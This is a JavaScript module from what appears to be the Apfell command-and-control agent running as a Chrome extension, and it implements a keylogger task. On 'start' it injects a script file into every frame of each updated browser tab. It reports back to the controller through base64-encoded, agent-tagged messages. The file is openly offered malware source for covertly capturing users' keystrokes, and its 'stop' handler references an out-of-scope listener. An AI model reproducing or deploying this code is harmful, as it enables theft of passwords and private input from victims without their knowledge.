exports.keylogger = function (task) {
    try {
        let args = JSON.parse(task.parameters.toString());
        switch (args.command) {
            case "start":
                if (logger.length > 0) {
                    let response = {"task_id":task.id, "user_output":"Keylogger already running", "completed": true};
                    let outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
                    let enc = JSON.stringify(outer_response);
                    let final = apfell.apfellid + enc;
                    let msg = btoa(unescape(encodeURIComponent(final)));
                    out.push(msg);
                    break;
                }

                chrome.tabs.onUpdated.addListener(function keylog(tabid, info) {
                    chrome.tabs.executeScript(tabid, {
                        allFrames: true,
                        file: 'utils/kl.js'
                    });
                });

                logger = task.task_id;
                let resp = {"task_id":task.id, "user_output":"Keylogger started", "completed": true};
                let outer_resp = {"action":"post_response", "responses":[resp], "delegates":[]};
                let e = JSON.stringify(outer_resp);
                let f = apfell.apfellid + e;
                let m = btoa(unescape(encodeURIComponent(f)));
                out.push(m);
                break;
            case "stop":
                chrome.tabs.onUpdated.removeListener(keylog);
                logger = "";
                let response = {"task_id":task.id, "user_output":"keylogger stopped", "completed": true};
                let outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
                let enc = JSON.stringify(outer_response);
                let final = apfell.apfellid + enc;
                let msg = btoa(unescape(encodeURIComponent(final)));
                out.push(msg);
                break;
            default:
                break;
        }
    } catch (error) {
        let response = {"task_id":task.id, "user_output":error.toString(), "completed": true, "status":"error"};
        let outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
        let enc = JSON.stringify(outer_response);
        let final = apfell.apfellid + enc;
        let msg = btoa(unescape(encodeURIComponent(final)));
        out.push(msg);
    }
};
COMMAND_ENDS_HERE